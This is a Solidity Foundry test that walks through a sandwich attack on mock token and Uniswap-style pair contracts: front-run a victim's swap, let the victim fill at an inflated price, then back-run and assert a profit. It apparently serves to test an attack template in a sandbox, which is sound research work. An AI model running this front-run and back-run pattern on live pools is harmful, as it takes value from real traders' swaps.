// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/mocks/MockERC20.sol";
import "../src/mocks/MockWETH.sol";
import "../src/mocks/MockUniPair.sol";

/**
 * @title SandwichAttackTest
 * @notice Proves the `sandwich_attack` template steps inline: attacker
 *         front-runs a victim swap to move the price, victim fills at a worse
 *         price, attacker back-runs for a profit.
 */
contract SandwichAttackTest is Test {
    MockERC20 public token;
    MockWETH public weth;
    MockUniPair public pair;
    address public victim;

    function setUp() public {
        victim = makeAddr("victim");
        token = new MockERC20("TKN", "TKN");
        weth = new MockWETH();
        pair = new MockUniPair(address(weth), address(token));

        // pool seeded 1000 WETH / 1000 TKN
        weth.deposit{value: 1000 ether}();
        weth.transfer(address(pair), 1000 ether);
        token.mint(address(pair), 1000 ether);
        pair.sync();
    }

    /// @dev Standard UniswapV2 getAmountOut (single division -> rounds down,
    ///      so the mock's constant-product K check always passes).
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }

    function testSandwichAttack() public {
        // FRONT-RUN: attacker buys TKN with WETH at the fair pre-swap price
        // (~9.87 TKN for 10 WETH on the 1000/1000 pool)
        (uint256 r0, uint256 r1) = pair.getReserves();
        uint256 tknOut = getAmountOut(10 ether, r0, r1);
        weth.deposit{value: 10 ether}();
        weth.transfer(address(pair), 10 ether);
        pair.swap(0, tknOut, address(this));
        uint256 tknHeld = token.balanceOf(address(this));
        assertGt(tknHeld, 9 ether, "front-run bought token");

        // VICTIM: buys 100 TKN at the inflated price
        (r0, r1) = pair.getReserves();
        uint256 victimIn = 120 ether;
        weth.deposit{value: victimIn}();
        weth.transfer(address(pair), victimIn);
        pair.swap(0, 100 ether, victim);
        assertEq(token.balanceOf(victim), 100 ether, "victim swap filled");

        // BACK-RUN: attacker sells the TKN back for WETH
        (r0, r1) = pair.getReserves();
        uint256 expectedOut = getAmountOut(tknHeld, r1, r0);
        token.approve(address(pair), tknHeld);
        token.transfer(address(pair), tknHeld);
        pair.swap(expectedOut * 95 / 100, 0, address(this));

        // attacker net: got more WETH out than put in
        assertGt(weth.balanceOf(address(this)), 10 ether, "back-run profit");
    }
}
